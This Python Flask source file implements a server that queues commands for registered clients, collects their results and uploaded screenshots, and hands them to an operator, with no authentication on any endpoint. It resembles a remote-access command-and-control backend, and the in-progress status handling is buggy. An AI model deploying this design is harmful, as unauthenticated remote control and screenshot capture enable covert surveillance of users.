import json
import logging
import queue
import time

from flask import Flask, request, jsonify
from pathlib import Path
from threading import Thread, Lock

_cfg_path = Path(__file__).parent / "config.json"

with _cfg_path.open("r", encoding="utf-8") as f:
    cfg = json.load(f)

HOST = cfg["HOST"]
PORT = int(cfg["PORT"])

MAX_BUFFER_SIZE = int(cfg["MAX_BUFFER_SIZE"])

MAX_CLIENT_INACTIVE_TIME_SEC = float(cfg["MAX_CLIENT_INACTIVE_TIME_SEC"])
HEARTBEAT_CHECK_INTERVAL_SEC = float(cfg["HEARTBEAT_CHECK_INTERVAL_SEC"])

COMMAND_STATUS_ATTR = "__status"
COMMAND_STATUS_IN_PROGRESS = "in_progress"

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

app = Flask(__name__)
logger = logging.getLogger(__name__)
clients_lock = Lock()

# client_id -> {"commands": {}, "buffer": Queue(), "last_active": ts}
clients = {}

def dict_value_filter(d: dict, value_pred):
    return {k: v for k, v in d.items() if value_pred(v)}

def query_parameter_to_bool(parameter):
    return (parameter is not None) and (parameter in ("1", "true", "yes", "on"))

def safe_put_to_queue(q: queue.Queue, item):
    try:
        q.put(item, block=False)
    except queue.Full:
        try:
            q.get(block=False)
            q.task_done()
        except Exception:
            pass

        try:
            q.put(item, block=False)
        except queue.Full:
            logger.error("Buffer full, skipping item")

def ensure_client(client_id):
    if not client_id:
        return False

    with clients_lock:
        if client_id not in clients:
            clients[client_id] = {
                "commands": {},
                "buffer": queue.Queue(maxsize=MAX_BUFFER_SIZE),
                "last_active": time.time()
            }
        else:
            clients[client_id]["last_active"] = time.time()

    return True

def heartbeat_checker():
    while True:
        time.sleep(HEARTBEAT_CHECK_INTERVAL_SEC)
        logger.info("Start checking for inactive clients")

        curr_time = time.time()

        with clients_lock:
            for client_id in list(clients.keys()):
                curr_client_last_active = clients[client_id].get("last_active")

                if curr_client_last_active is None:
                    continue

                if curr_time - curr_client_last_active > MAX_CLIENT_INACTIVE_TIME_SEC:
                    del clients[client_id]
                    logger.info(f"Client {client_id} disconnected due to inactivity")

        logger.info("All clients checked for inactivity")

# Client connects to server
@app.route('/connect', methods=['POST'])
def connect():
    data = request.json or {}
    client_id = data.get("client_id")

    logger.info(f"Trying to connect client {client_id}")

    if not client_id:
        logger.warning("Client ID not specified")
        return jsonify({"error": "client_id required"}), 400

    ensure_client(client_id)
    logger.info(f"Client {client_id} connected")

    return jsonify({"status": "connected"}), 200

# Admin posts a command to a client
@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json or {}
    client_id = data.get("client_id")
    command = data.get("command")
    payload = data.get("payload", {})

    logger.info(f"Trying to post command {command} for client {client_id}")

    if not client_id or not command:
        logger.warning("Client ID or command name not specified")
        return jsonify({"error": "client_id and command required"}), 400

    with clients_lock:
        if client_id not in clients:
            logger.warning(f"Client {client_id} not found")
            return jsonify({"error": "client not found"}), 404

        clients[client_id]["commands"][command] = payload

    logger.info(f"Command {command} queued to client {client_id}")

    return jsonify({
        "status": "command queued",
        "command": command,
        "payload": payload
    }), 200

# Client polls for commands
@app.route('/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    logger.info(f"Trying to get command for client {client_id}")

    commands = []
    not_in_progress_param = request.args.get('not_in_progress')
    not_in_progress = query_parameter_to_bool(not_in_progress_param)

    with clients_lock:
        if client_id not in clients:
            logger.warning(f"Client {client_id} not found")
            return jsonify({"error": "client not found"}), 404

        commands = clients[client_id]["commands"].copy()

        if not_in_progress:
            commands = dict_value_filter(
                commands,
                lambda t: t.get(COMMAND_STATUS_ATTR) != COMMAND_STATUS_IN_PROGRESS
            )

    logger.info(f"Client {client_id} has the following commands: {commands}")

    return jsonify({"commands": commands}), 200

# Client reports command execution result
@app.route('/commands/<client_id>', methods=['POST'])
def post_command_result(client_id):
    data = request.json or {}
    command = data.get("command")
    result = data.get("result", {})
    in_progress = data.get("in_progress", False)

    if in_progress:
        logger.info(f"Trying to report that {command} command for client {client_id} in progress")
    else:
        logger.info(f"Trying to report {command} command result for client {client_id}")

    if not command:
        logger.warning("Command name not specified")
        return jsonify({"error": "command required"}), 400

    with clients_lock:
        if client_id not in clients:
            logger.warning(f"Client {client_id} not found")
            return jsonify({"error": "client not found"}), 404

        if in_progress:
            clients[client_id]["commands"][COMMAND_STATUS_ATTR] = COMMAND_STATUS_IN_PROGRESS
        else:
            safe_put_to_queue(
                clients[client_id]["buffer"],
                {"type": "command_result", "command": command, "result": result}
            )

            clients[client_id]["commands"].pop(command, None)
            clients[client_id]["last_active"] = time.time()

    logger.info(f"Client {client_id} reported result for command {command}: {result}")

    return jsonify({"status": "result received"}), 200

# Client posts screenshot
@app.route('/screenshot/<client_id>', methods=['POST'])
def collect_screenshot(client_id):
    logger.info(f"Trying to post screenshot for client {client_id}")

    with clients_lock:
        if client_id not in clients:
            logger.warning(f"Client {client_id} not found")
            return jsonify({"error": "client not found"}), 404

        data = request.json or {}

        safe_put_to_queue(
            clients[client_id]["buffer"],
            {"type": "screenshot", "data": data}
        )

        clients[client_id]["last_active"] = time.time()

    logger.info(f"Received screenshot from client {client_id}")

    return jsonify({"status": "received"}), 200

# Admin retrieves client buffer (screenshots, command results)
@app.route('/buffer/<client_id>', methods=['GET'])
def get_buffer(client_id):
    logger.info(f"Trying to retrive client {client_id} buffer")

    with clients_lock:
        if client_id not in clients:
            logger.warning(f"Client {client_id} not found")
            return jsonify({"error": "client not found"}), 404

        output_buffer = []
        client_buffer = clients[client_id]["buffer"]

        while not client_buffer.empty():
            output_buffer.append(client_buffer.get())

    logger.info(f"Retrieved client {client_id} buffer")

    return jsonify({"data": output_buffer}), 200

# Client reports that he is alive
@app.route('/heartbeat/<client_id>', methods=['POST'])
def heartbeat(client_id):
    logger.info(f"Trying to report that client {client_id} is alive")

    if not client_id:
        logger.warning("Client ID not specified")
        return jsonify({"error": "client_id required"}), 400

    created = ensure_client(client_id)

    if created:
        logger.info(f"Client {client_id} created via heartbeat")

    logger.info(f"Client {client_id} reported that he is alive")

    return jsonify({"status": "heartbeat received"}), 200

if __name__ == '__main__':
    Thread(target=heartbeat_checker, daemon=True).start()
    app.run(host=HOST, port=PORT)
